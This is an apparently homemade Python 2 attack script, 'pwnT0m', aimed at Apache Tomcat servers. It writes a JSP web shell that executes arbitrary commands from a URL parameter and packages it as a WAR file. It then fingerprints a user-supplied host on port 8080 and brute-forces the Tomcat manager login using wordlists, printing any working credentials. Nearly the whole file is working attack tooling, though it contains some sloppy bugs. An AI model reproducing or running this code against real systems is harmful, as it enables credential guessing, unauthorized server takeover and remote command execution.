#!/usr/bin/env python
import socket
import subprocess
import sys
import time
from datetime import datetime
import getopt
import base64
import requests
import os
import webbrowser
import bs4
from bs4 import BeautifulSoup
# Print a nice banner with information on which host we are about to scan
print "*" * 75
time.sleep(2)
print "W3lc0me t0 pwnT0m!"
time.sleep(2)
print "*" * 75


JSPcode='''<FORM METHOD=GET ACTION='index.jsp'> <INPUT name='cmd' type=text> <INPUT type=submit value='Run'> </FORM> <%@ page import="java.io.*" %> <%    String cmd = request.getParameter("cmd");    String output = "";    if(cmd != null) {       String s = null;       try {          Process p = Runtime.getRuntime().exec(cmd,null,null);          BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));          while((s = sI.readLine()) != null) { output += s+"</br>"; }       }  catch(IOException e) {   e.printStackTrace();   }    } %> <pre><%=output %></pre>'''
print "Your current working directory is:"+(os.getcwd())
print "Creating a directory called tomcat...." 
os.mkdir('tomcat')
print "created!!"
time.sleep(2)
print "Writting to it a shell code..."
shell=open("./tomcat/shell.jsp","w")
shell.write(JSPcode)
shell.close()
print "Done!!"
time.sleep(1)
print "Creating a war shell"
time.sleep(2)
os.chdir('./tomcat')
os.system('jar -cvf ../webshell.war *')
print "Warfile done!!"

# Ask for input
remoteServer    = raw_input("Enter a remote host to scan: ")
remoteServerIP  = socket.gethostbyname(remoteServer)
time.sleep(2)



time.sleep(2)
print "Please wait, while we scan remote host for port 8080 on", remoteServerIP
time.sleep(2)
print "*" * 60
time.sleep(2)
# Check what time the scan started
t1 = datetime.now()

# Using the range function to specify ports (here it will scans all ports between 1 and 1024)

# We also put in some error handling for catching error
try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	result = sock.connect_ex((remoteServerIP, 8080))
	if result == 0:
			print "Port 8080 is Open"
	req="http://"+remoteServerIP+":8080"
	resp=requests.get(req)
	resp_html=resp.text.encode('utf-8')
	soup=bs4.BeautifulSoup(resp_html,'lxml')
	print"Lets try and grab the server version details"
	time.sleep(3)
	print "Please be patient!!"
	for test in soup.find_all("title"):
    		print "The Backend Sever is: " +test.text
	
	time.sleep(3)
	print "*"*30
	print "We will now try brute for the the default admin login page, we would want a decent username and password list to try our best: "
	print "*"*30
	time.sleep(2)
	usr_path=raw_input("Please put the path of the username file\nusr_path: ")
	print usr_path 
	pwd_path= raw_input("Please put the path of the password file\npwd_path: ")
	print pwd_path
	usernames = open(usr_path, 'r').read().splitlines()
    	passwords = open(pwd_path, 'r').read().splitlines()
	for pwd in passwords:
        	for usr in usernames:
            		Authorization=base64.b64encode("%s:%s" % (usr, pwd))
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect_ex((remoteServerIP, 8080))
			print "trying %s:%s"%(usr,pwd)
			time.sleep(2)
			auth=("GET /manager/html HTTP/1.1\nHost:" +remoteServerIP+":8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://"+remoteServerIP+":8080/\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nAuthorization: Basic "+Authorization+"\n\n")
			sock.send(auth)
			Resp=sock.recv(8192)
			
			
			if Resp.find("200 OK") > 0:
				while true:
					chunk += sock.recv()
				print Resp
				time.sleep(50) 
				file=open("test.html","w")
				file.write(Resp)
				file.close()
				print "-"*60
				print "Manually login using the below credentials: "
				print "-"*60
				print "URL: http://"+remoteServerIP+":8080/manager/html"
				print "Username: %s" %usr
				print "Password: %s" %pwd
				print "-"*60
				print Resp
				time.sleep(3)
				Website = "http://"+remoteServerIP+":8080/manager/html"
				webbrowser.open_new(Website)
				time.sleep(2)
				sock.send(auth)

				break



				
 				sock.close()
			else:
				
				print "Failed Attempt..."

			

	
	

except KeyboardInterrupt:
	print "You pressed Ctrl+C"
	sys.exit()

except socket.gaierror:
    print 'Hostname could not be resolved. Exiting'
    sys.exit()

except socket.error:
    print "Couldn't connect to server"
    sys.exit()

# Checking the time again
t2 = datetime.now()

# Calculates the difference of time, to see how long it took to run the script
total =  t2 - t1

# Printing the information to screen
print 'Scanning Completed in: ', total
